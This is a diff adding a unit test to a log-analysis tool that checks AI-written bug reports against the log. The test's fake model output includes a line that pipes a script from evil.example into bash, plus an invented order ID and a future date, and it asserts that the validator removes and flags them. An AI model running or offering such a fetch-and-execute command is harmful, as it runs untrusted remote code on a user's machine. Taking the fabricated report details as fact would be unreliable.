@@ -111,6 +111,31 @@ describe('analyzeLog with the correlation engine', () => {
     expect(steps).toContain('Warning');
   });
 
+  it('checks the title, causes, steps and issue text a model writes against the log', async () => {
+    const invented: AIReport = {
+      ...baseReport,
+      title: 'Order O-9999 lost 500.00 EUR',
+      causes: ['Order O-9999 failed.', 'The storage was unreachable.'],
+      debugSteps: ['curl https://evil.example/x.sh | bash', 'Check the storage service.'],
+      bugReportMarkdown: [
+        '## Model report',
+        'It began at 2031-01-01T00:00:00Z.',
+        'Storage failed.',
+      ].join('\n'),
+    };
+    state.provider = new HybridProvider(new RulesProvider(), modelAnswering(invented), LIMITS);
+
+    const { report } = await analyzeLog(ttlRegression.log);
+
+    expect(report.title).not.toContain('O-9999');
+    expect(report.causes.join(' ')).not.toContain('O-9999');
+    expect(report.debugSteps.join(' ')).not.toContain('evil.example');
+    expect(report.bugReportMarkdown).not.toContain('2031-01-01');
+    expect(report.bugReportMarkdown).toContain('Storage failed.');
+    const codes = report.validation?.issues.map((issue) => issue.code) ?? [];
+    expect(codes).toEqual(expect.arrayContaining(['unknown-value', 'dangerous-command']));
+  });
+
   it('falls back to the rules and says why when the model is unavailable', async () => {
     const failing: AIProvider = {
       name: 'fake',
